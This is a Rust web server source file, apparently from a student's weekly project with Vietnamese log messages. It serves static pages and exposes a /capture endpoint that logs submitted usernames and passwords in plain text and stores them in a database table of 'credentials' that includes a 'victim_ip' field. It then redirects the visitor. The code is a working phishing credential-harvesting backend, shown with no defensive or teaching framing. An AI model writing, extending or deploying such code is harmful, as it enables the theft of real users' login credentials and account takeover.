use axum::{
    extract::{Form, State},
    routing::{get_service, post},
    response::{Redirect, IntoResponse},
    http::StatusCode,
    Router,
    serve,
};
use tower_http::services::ServeDir;
use std::net::SocketAddr;
use tokio::net::TcpListener;


use sqlx::{postgres::PgPoolOptions, Pool, Postgres};
use dotenv::dotenv;
use std::env;
use uuid::Uuid; 
use chrono::Utc; 

use serde::Deserialize;

#[derive(Deserialize)]
struct LoginForm {
    username: String,
    password: String,
}

#[derive(Clone)] 
struct AppState {
    db_pool: Pool<Postgres>,
    
}

#[tokio::main]
async fn main() {
  
    dotenv().ok();

    let database_url = env::var("DATABASE_URL")
        .expect("Thiếu biến môi trường DATABASE_URL. Vui lòng cấu hình file .env");


    let db_pool = PgPoolOptions::new()
        .max_connections(5) 
        .connect(&database_url)
        .await
        .expect("Không thể kết nối đến database");
    sqlx::migrate!("./migrations")
        .run(&db_pool)
        .await
        .expect("Lỗi khi chạy database migrations");

    println!("Database migrations chạy thành công!");

    let app_state = AppState { db_pool };

    let app = Router::new()
        .nest_service(
            "/", 
            ServeDir::new("content").append_index_html_on_directories(true)
        )
        
        .route("/capture", post(capture_credentials_handler))
        
        .with_state(app_state); 

    let addr = SocketAddr::from(([0, 0, 0, 0], 3000));
    println!("Server đang chạy http://{}", addr);

    let listener = TcpListener::bind(&addr).await.unwrap();
    serve(listener, app).await.unwrap();
}

async fn capture_credentials_handler(
    State(state): State<AppState>, 
    Form(credentials): Form<LoginForm>
) -> impl axum::response::IntoResponse {
    println!("Đã thu thập thông tin đăng nhập:");
    println!("Username: {}", credentials.username);
    println!("Password: {}", credentials.password);

    let victim_ip = "N/A".to_string(); 
    let user_agent = "N/A".to_string(); 
    let captured_at = Utc::now();
    let id = Uuid::new_v4();

    let result = sqlx::query!(
        r#"
        INSERT INTO credentials (id, username, password, victim_ip, user_agent, captured_at)
        VALUES ($1, $2, $3, $4, $5, $6)
        "#,
        id,
        credentials.username,
        credentials.password,
        victim_ip,
        user_agent,
        captured_at
    )
    .execute(&state.db_pool) 
    .await;

    match result {
        Ok(_) => println!("Đã lưu thông tin đăng nhập vào database"),
        Err(e) => eprintln!("Lỗi khi lưu thông tin vào database: {}", e),
    }

    //cc

    let redirect_url = "D:/Project_2_Rust/Week7/content/after.html";
    println!("Redirecting to: {}", redirect_url);
    Redirect::to(redirect_url).into_response()
}